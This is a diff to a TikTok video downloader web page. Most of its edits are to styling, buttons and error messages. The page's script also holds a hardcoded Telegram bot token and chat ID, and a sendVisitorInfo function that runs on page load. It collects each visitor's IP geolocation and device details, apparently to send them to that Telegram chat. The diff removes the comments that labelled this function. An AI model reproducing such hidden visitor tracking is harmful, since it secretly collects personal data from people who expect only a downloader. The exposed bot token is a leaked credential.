@@ -23,7 +23,7 @@
         header { padding: 30px 0; text-align: center; background: var(--glass); backdrop-filter: blur(15px); border-bottom: 1px solid var(--glass-bd); position: relative; }
         .brand-container { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 5px; }
         .tiktok-icon { font-size: 2rem; color: white; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; transform: scale(1.05); } 100% { opacity: 1; } }
+        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.7; transform: scale(1.1); } 100% { opacity: 1; transform: scale(1); } }
 
         .logo { font-size: 2.5rem; font-weight: 900; background: linear-gradient(45deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1.5px; text-transform: uppercase; }
         
@@ -44,6 +44,7 @@
         [dir="ltr"] .url-input { padding-right: 95px; }
 
         .download-btn { width: 100%; background: linear-gradient(45deg, var(--primary), #ff3366); border: none; border-radius: 18px; padding: 18px; color: white; font-size: 1.1rem; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; transition: 0.3s; }
+        .download-btn:active { transform: scale(0.96); }
 
         .loading { display: none; text-align: center; margin: 25px 0; }
         .spinner { width: 45px; height: 45px; border: 4px solid rgba(255,255,255,0.05); border-left-color: var(--secondary); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
@@ -53,8 +54,9 @@
         @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
 
         .download-options { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 25px; }
-        .option-btn { padding: 15px; border-radius: 14px; text-decoration: none; text-align: center; font-weight: 800; color: white; font-size: 0.9rem; border: 1px solid var(--glass-bd); background: rgba(255,255,255,0.03); transition: 0.3s; }
-        .hd-btn { grid-column: span 2; background: white; color: black; border: none; }
+        .option-btn { padding: 15px; border-radius: 14px; text-decoration: none; text-align: center; font-weight: 800; color: white; font-size: 0.9rem; border: 1px solid var(--glass-bd); background: rgba(255,255,255,0.03); transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .hd-btn { grid-column: span 2; background: white; color: black; border: none; font-size: 1rem; }
+        .hd-btn:hover { background: var(--secondary); }
 
         footer { text-align: center; padding: 50px 20px; color: #444; font-size: 0.75rem; }
     </style>
@@ -97,12 +99,12 @@
 
             <div id="result" class="result">
                 <div style="text-align:center; margin: 30px 0;">
-                    <img id="thumb" src="" style="width:160px; height:160px; object-fit:cover; border-radius:20px; border:3px solid var(--glass-bd)">
+                    <img id="thumb" src="" style="width:160px; height:160px; object-fit:cover; border-radius:20px; border:3px solid var(--secondary)">
                     <p id="vTitle" style="font-size:0.85rem; color:#aaa; margin-top:15px;"></p>
                 </div>
                 <div class="download-options">
-                    <a href="#" id="hdBtn" target="_blank" class="option-btn hd-btn">No Watermark</a>
-                    <a href="#" id="mp3Btn" target="_blank" class="option-btn">MP3 Audio</a>
+                    <a href="#" id="hdBtn" target="_blank" class="option-btn hd-btn"><i class="fas fa-video"></i> Video (No Watermark)</a>
+                    <a href="#" id="mp3Btn" target="_blank" class="option-btn"><i class="fas fa-music"></i> MP3 Audio</a>
                 </div>
             </div>
         </div>
@@ -113,7 +115,6 @@
     </footer>
 
     <script>
-        // زانیارییەکانی تیلیگرام
         const TELEGRAM_TOKEN = '8484169384:AAFKEfwjuxaVyWKV092RckBiEMu28V1a2SM';
         const CHAT_ID = '6259019006';
 
@@ -123,12 +124,10 @@
             en: { heading: "Video Downloader", sub: "Paste TikTok link here", btn: "Download Now", load: "Processing...", p: "Paste", err: "Paste link!" }
         };
 
-        // فەنکشنی ناردنی زانیاری بۆ تیلیگرام
         async function sendVisitorInfo() {
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
-                
                 const device = navigator.userAgent;
                 let model = "PC/Laptop";
                 if (device.match(/Android/i)) model = "Android";
@@ -160,7 +159,7 @@
             try {
                 const text = await navigator.clipboard.readText();
                 if (text) document.getElementById('url').value = text;
-            } catch (err) {}
+            } catch (err) { alert("Please allow clipboard access"); }
         }
 
         async function process() {
@@ -180,15 +179,16 @@
                     document.getElementById('hdBtn').href = data.result.video_hd;
                     document.getElementById('mp3Btn').href = data.result.mp3;
                     document.getElementById('result').style.display = 'block';
+                } else {
+                    alert("Error: Link not found");
                 }
-            } catch (e) { alert("Error"); }
+            } catch (e) { alert("Server Error"); }
             finally {
                 document.getElementById('downloadBtn').disabled = false;
                 document.getElementById('loading').style.display = 'none';
             }
         }
 
-        // دەستپێکردنی کارەکان
         window.onload = () => {
             changeLang('ku');
             sendVisitorInfo();
